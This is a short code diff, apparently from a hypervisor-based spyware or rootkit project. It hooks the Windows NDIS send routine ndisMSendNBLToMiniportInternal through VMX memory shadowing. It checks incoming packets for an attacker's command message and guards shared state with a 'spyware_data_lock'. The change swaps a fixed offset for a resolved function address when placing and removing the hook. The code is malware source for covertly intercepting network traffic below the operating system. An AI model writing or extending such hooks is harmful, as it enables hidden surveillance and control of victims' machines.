@@ -143,7 +143,7 @@ void check_router_arp(byte_t *pkt){
 
     // Activate sending
     shared_cores_data.send_requests = TRUE;
-    hook_function(guest_virtual_to_physical(shared_cores_data.ndis + NDIS_ndisMSendNBLToMiniportInternal_OFFSET), &shared_cores_data.memory_shadowing_pages.ndisMSendNBLToMiniportInternal_x, shared_cores_data.memory_shadowing_pages.ndisMSendNBLToMiniportInternal_rw);
+    hook_function(guest_virtual_to_physical(shared_cores_data.functions.ndisMSendNBLToMiniportInternal), &shared_cores_data.memory_shadowing_pages.ndisMSendNBLToMiniportInternal_x, shared_cores_data.memory_shadowing_pages.ndisMSendNBLToMiniportInternal_rw);
 
 }
 
@@ -184,7 +184,7 @@ BOOL check_if_attacker_msg(byte_t *pkt){
 
         // Start sending requests again
         shared_cores_data.send_requests = TRUE;
-        hook_function(guest_virtual_to_physical(shared_cores_data.ndis + NDIS_ndisMSendNBLToMiniportInternal_OFFSET), &shared_cores_data.memory_shadowing_pages.ndisMSendNBLToMiniportInternal_x, shared_cores_data.memory_shadowing_pages.ndisMSendNBLToMiniportInternal_rw);
+        hook_function(guest_virtual_to_physical(shared_cores_data.functions.ndisMSendNBLToMiniportInternal), &shared_cores_data.memory_shadowing_pages.ndisMSendNBLToMiniportInternal_x, shared_cores_data.memory_shadowing_pages.ndisMSendNBLToMiniportInternal_rw);
 
         return TRUE;
     }
@@ -241,7 +241,7 @@ void handle_ndisMSendNBLToMiniportInternal_hook(vmexit_data_t *state){
             __vmwrite(CONTROL_PIN_BASED_VM_EXECUTION_CONTROLS, pin_based_ctls.value);
             __vmwrite(GUEST_VMX_PREEMPTION_TIMER, 0x2ffffff);
         }
-        *(byte_t*)guest_virtual_to_physical(shared_cores_data.ndis + NDIS_ndisMSendNBLToMiniportInternal_OFFSET) = PUSH_RBP;
+        *(byte_t*)guest_virtual_to_physical(shared_cores_data.functions.ndisMSendNBLToMiniportInternal) = PUSH_RBP;
 
         return;
 
@@ -278,7 +278,7 @@ void handle_ndisMSendNBLToMiniportInternal_hook(vmexit_data_t *state){
 
     // remove the hook and release the lock
     shared_cores_data.send_pending = FALSE;
-    *(byte_t*)guest_virtual_to_physical(shared_cores_data.ndis + NDIS_ndisMSendNBLToMiniportInternal_OFFSET) = PUSH_RBP;
+    *(byte_t*)guest_virtual_to_physical(shared_cores_data.functions.ndisMSendNBLToMiniportInternal) = PUSH_RBP;
     ReleaseLock(&shared_cores_data.spyware_data_lock);
 
 }
